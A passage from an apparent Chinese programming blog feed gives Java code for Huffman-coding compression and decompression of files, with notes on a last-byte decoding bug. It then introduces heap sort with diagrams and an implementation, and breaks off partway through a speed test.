strByte;</span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">8</span> &gt; stringBuilder.length()) &#123;</span><br><span class="line">strByte = stringBuilder.substring(i);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">strByte = stringBuilder.substring(i, i + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">huffmanCodeBytes[index++] = (<span class="type">byte</span>) Integer.parseInt(strByte, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> huffmanCodeBytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">StringBuilder</span> <span class="variable">huffmanStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();<span class="comment">//存储赫夫曼编码对应的字符串</span></span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[-88, -65, -56, -65, -56, -65, -55, 77, -57, 6, -24, -14, -117, -4, -60, -90, 28]</p><h3 id="哈夫曼数据压缩封装"><a href="#哈夫曼数据压缩封装" class="headerlink" title="哈夫曼数据压缩封装"></a>哈夫曼数据压缩封装</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用一个方法，将前面的方法封装起来，便于我们的调用.</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes 原始的字符串对应的字节数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是经过 赫夫曼编码处理后的字节数组(压缩后的数组)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] huffmanZip(<span class="type">byte</span>[] bytes) &#123;</span><br><span class="line">List&lt;Node&gt; nodes = getNodes(bytes);</span><br><span class="line"><span class="comment">// 根据 nodes 创建的赫夫曼树</span></span><br><span class="line"><span class="type">Node</span> <span class="variable">huffmanTreeRoot</span> <span class="operator">=</span> createHuffmanTree(nodes);</span><br><span class="line"><span class="comment">// 对应的赫夫曼编码(根据 赫夫曼树)</span></span><br><span class="line">Map&lt;Byte, String&gt; huffmanCodes = getCodes(huffmanTreeRoot);</span><br><span class="line"><span class="comment">// 根据生成的赫夫曼编码，压缩得到压缩后的赫夫曼编码字节数组</span></span><br><span class="line"><span class="type">byte</span>[] huffmanCodeBytes = zip(bytes, huffmanCodes);</span><br><span class="line"><span class="keyword">return</span> huffmanCodeBytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据解压"><a href="#数据解压" class="headerlink" title="数据解压"></a>数据解压</h2><h3 id="字节转二进制字符串"><a href="#字节转二进制字符串" class="headerlink" title="字节转二进制字符串"></a>字节转二进制字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">byteToBitString</span><span class="params">(<span class="type">boolean</span> flag, <span class="type">byte</span> b)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> b; </span><br><span class="line"><span class="keyword">if</span> (flag) &#123;<span class="comment">//当flag为true时，补高位</span></span><br><span class="line">temp |= <span class="number">256</span>; <span class="comment">// 按位或 256 1 0000 0000 | 0000 0001 =&gt; 1 0000 0001</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Integer.toBinaryString(temp); <span class="comment">// 返回的是temp对应的二进制的补码</span></span><br><span class="line"><span class="keyword">if</span> (flag) &#123; </span><br><span class="line"><span class="keyword">return</span> str.substring(str.length() - <span class="number">8</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么补高位：</strong></p><p>String str &#x3D; Integer.toBinaryString(56);  &#x2F;&#x2F;返回 11 1000</p><p>String str &#x3D; Integer.toBinaryString(56 | 256);  &#x2F;&#x2F;返回 1 0011 1000</p><p><strong>为什么要截取8位：</strong></p><p>String str &#x3D; Integer.toBinaryString(56 | 256);  &#x2F;&#x2F;返回 1 0011 1000</p><p>String str &#x3D; Integer.toBinaryString(-88); &#x2F;&#x2F;返回11111111111111111111111110101000</p><p>String str &#x3D; Integer.toBinaryString(-88 | 256); &#x2F;&#x2F;返回11111111111111111111111110101000</p><h3 id="哈夫曼解码"><a href="#哈夫曼解码" class="headerlink" title="哈夫曼解码"></a>哈夫曼解码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(Map&lt;Byte, String&gt; huffmanCodes, <span class="type">byte</span>[] huffmanBytes) &#123;</span><br><span class="line"><span class="comment">// 1.将压缩后的字节数组转换成原先的&quot;10101000101111111...&quot;</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; huffmanBytes.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">stringBuilder.append(byteToBitString(<span class="literal">true</span>, huffmanBytes[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 字节数组的最后一个字节另做处理，如果是负数，flag为true；</span></span><br><span class="line"><span class="comment">// 如果是正数，flag为false，拼接后长度与原先相等不做处理，若小于原先长度则先补0后拼接，使其与原先长度相等</span></span><br><span class="line"><span class="keyword">if</span> (huffmanBytes[huffmanBytes.length - <span class="number">1</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">stringBuilder.append(byteToBitString(<span class="literal">true</span>, huffmanBytes[huffmanBytes.length - <span class="number">1</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> byteToBitString(<span class="literal">false</span>, huffmanBytes[huffmanBytes.length - <span class="number">1</span>]);</span><br><span class="line"><span class="keyword">while</span> (str.length() + stringBuilder.length() &lt; huffmanStr.length()) &#123;</span><br><span class="line">stringBuilder.append(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">stringBuilder.append(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将哈夫曼编码表转换成哈夫曼解码表</span></span><br><span class="line">Map&lt;String, Byte&gt; huffmanDecodes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Byte&gt;();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Byte, String&gt; b : huffmanCodes.entrySet()) &#123;</span><br><span class="line">huffmanDecodes.put(b.getValue(), b.getKey());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.把&quot;10101000101111111...&quot;按照指定的哈夫曼解码表进行解码</span></span><br><span class="line">List&lt;Byte&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Byte&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stringBuilder.length();) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">// 小的计数器</span></span><br><span class="line"><span class="type">Byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 1010100010111...</span></span><br><span class="line"><span class="comment">// 递增的取出 key 1</span></span><br><span class="line"><span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> stringBuilder.substring(i, i + count);<span class="comment">// i 不动，让count移动，指定匹配到一个字符</span></span><br><span class="line">b = huffmanDecodes.get(key);</span><br><span class="line"><span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;<span class="comment">// 说明没有匹配到</span></span><br><span class="line">count++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 匹配到</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">list.add(b);</span><br><span class="line">i += count;<span class="comment">// i 直接移动到 count</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">byte</span> b[] = <span class="keyword">new</span> <span class="title class_">byte</span>[list.size()];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">b[i] = list.get(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：韩顺平老师的代码是最后一个字节时，flag为false，不做任何处理。</strong></p><p><strong>BUG:如果压缩生成的最后一个byte数为负值，会多出24位1；</strong></p><p>​ <strong>如果最后一个byte为001等前面有0的正数时，还原后会少了前面的0。</strong></p><p><strong>所以我们另外取最后一个字节处理。</strong></p><h2 id="文件压缩"><a href="#文件压缩" class="headerlink" title="文件压缩"></a>文件压缩</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">zipFile</span><span class="params">(String srcFile, String dstFile)</span> &#123;</span><br><span class="line"><span class="comment">// 创建输出流</span></span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 创建文件的输入流</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建文件的输入流</span></span><br><span class="line">is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line"><span class="comment">// 创建一个和源文件大小一样的byte[]</span></span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[is.available()];</span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line">is.read(b);</span><br><span class="line"><span class="comment">// 直接对源文件压缩</span></span><br><span class="line"><span class="type">byte</span>[] huffmanBytes = huffmanZip(b);</span><br><span class="line"><span class="comment">// 创建文件的输出流, 存放压缩文件</span></span><br><span class="line">os = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dstFile);</span><br><span class="line"><span class="comment">// 创建一个和文件输出流关联的ObjectOutputStream</span></span><br><span class="line">oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(os);</span><br><span class="line"><span class="comment">// 把 赫夫曼编码后的字节数组写入压缩文件</span></span><br><span class="line">oos.writeObject(huffmanBytes); <span class="comment">// 我们是把</span></span><br><span class="line"><span class="comment">// 这里我们以对象流的方式写入 赫夫曼编码，是为了以后我们恢复源文件时使用</span></span><br><span class="line"><span class="comment">// 注意一定要把赫夫曼编码 写入压缩文件</span></span><br><span class="line">oos.writeObject(huffmanCodes);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">is.close();</span><br><span class="line">oos.close();</span><br><span class="line">os.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件解压"><a href="#文件解压" class="headerlink" title="文件解压"></a>文件解压</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unZipFile</span><span class="params">(String zipFile, String dstFile)</span> &#123;</span><br><span class="line"><span class="comment">//定义文件输入流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//定义一个对象输入流</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//定义文件的输出流</span></span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//创建文件输入流</span></span><br><span class="line">is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(zipFile);</span><br><span class="line"><span class="comment">//创建一个和  is关联的对象输入流</span></span><br><span class="line">ois = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="comment">//读取byte数组  huffmanBytes</span></span><br><span class="line"><span class="type">byte</span>[] huffmanBytes = (<span class="type">byte</span>[])ois.readObject();</span><br><span class="line"><span class="comment">//读取赫夫曼编码表</span></span><br><span class="line">Map&lt;Byte,String&gt; huffmanCodes = (Map&lt;Byte,String&gt;)ois.readObject();</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="type">byte</span>[] bytes = decode(huffmanCodes, huffmanBytes);</span><br><span class="line"><span class="comment">//将bytes 数组写入到目标文件</span></span><br><span class="line">os = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dstFile);</span><br><span class="line"><span class="comment">//写数据到 dstFile 文件</span></span><br><span class="line">os.write(bytes);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">os.close();</span><br><span class="line">ois.close();</span><br><span class="line">is.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">System.out.println(e2.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200813152002.png"></p><p>可以看到压缩和解压成功了，解压后的图片与原来一致，大小也完全一样。</p><h2 id="哈夫曼编码压缩文件注意事项"><a href="#哈夫曼编码压缩文件注意事项" class="headerlink" title="哈夫曼编码压缩文件注意事项"></a>哈夫曼编码压缩文件注意事项</h2><ol><li>如果文件本身就是经过压缩处理的，那么使用赫夫曼编码再压缩效率不会有明显变化, 比如视频,ppt 等等文件。</li><li>赫夫曼编码是按字节来处理的，因此可以处理所有的文件(二进制文件、文本文件)。</li><li>如果一个文件中的内容，重复的数据不多，压缩效果也不会很明显。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈夫曼树 </tag>
            
            <tag> 哈夫曼编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆排序</title>
      <link href="/posts/b66a/"/>
      <url>/posts/b66a/</url>
      
        <content type="html"><![CDATA[<h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><blockquote><ol><li>堆排序是利用堆这种数据结构而设计的一种排序算法，堆排序是一种选择排序，它的最坏，最好，平均时间复杂度均为O(nlogn)，它也是不稳定排序。</li><li>堆是具有以下性质的完全二叉树：<ul><li>每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆。</li><li>每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。</li><li><strong>注意 : 没有要求结点的左孩子的值和右孩子的值的大小关系。</strong></li></ul></li><li>一般升序采用大顶堆，降序采用小顶堆。</li></ol></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810153925.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810153952.png"></p><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><ol><li>将待排序序列构造成一个大顶堆，此时整个序列的最大值就是堆顶的根节点arr[0]。</li><li>将其与末尾元素进行交换，此时末尾就为最大值。</li><li>然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。</li><li>反复执行，便能得到一个有序序列了。</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要求：给你一个数组 {4,6,8,5,9} , 要求使用堆排序法，将数组升序排序。 </p><hr><p>我们从最后一个非叶子结点开始（最后一个非叶子结点 arr.length&#x2F;2-1&#x3D;5&#x2F;2-1&#x3D;1，也就是下面的6结点），从左子节点至右子节点，从子节点至父节点进行调整，让元素大的成为父节点。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192351.png"></p><p>2.找到第二个非叶子节点，也是就是下标为0的4，由于[4,9,8]中9元素最大，4和9交换。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192412.png"></p><p>这时，交换导致了子树[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192438.png"></p><p>此时，<strong>步骤一 将一个无序序列构造成了一个大顶堆</strong>就完成了。</p><p><strong>步骤二 将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整堆，再将堆顶元素与末尾元素交换，得到第二大元素。如此反复进行交换、重建、交换。</strong></p><p>a.将堆顶元素9和末尾元素4进行交换</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192455.png"></p><p>b.重新调整结构，使其继续满足堆定义</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192510.png"></p><p>c.再将堆顶元素8与末尾元素5进行交换，得到第二大元素8.</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192527.png"></p><p>后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200810192559.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span> &#125;;</span><br><span class="line">heapSort(arr);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> arr.length / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;<span class="comment">//步骤一：将一个无序序列构造成了一个大顶堆</span></span><br><span class="line">adjustHeap(arr, i, arr.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> arr.length - <span class="number">1</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[<span class="number">0</span>];</span><br><span class="line">arr[<span class="number">0</span>] = temp;</span><br><span class="line">adjustHeap(arr, <span class="number">0</span>, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">adjustHeap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> i, <span class="type">int</span> length)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">1</span>; k &lt; length; k = <span class="number">2</span> * k + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[(k - <span class="number">1</span>) / <span class="number">2</span>];<span class="comment">//父节点</span></span><br><span class="line"><span class="keyword">if</span> ((k + <span class="number">1</span>) &lt; length &amp;&amp; arr[k] &lt; arr[k + <span class="number">1</span>]) &#123;<span class="comment">//比较左右子节点</span></span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[k] &gt; temp) &#123;</span><br><span class="line">arr[(k - <span class="number">1</span>) / <span class="number">2</span>] = arr[k];</span><br><span class="line">arr[k] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试堆排序的速度"><a href="#测试堆排序的速度" class="headerlink" title="测试堆排序的速度"></a>测试堆排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建8000000个的随机树的数组，八百万</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8000000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8000000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">heapSort(arr);</span><br><span 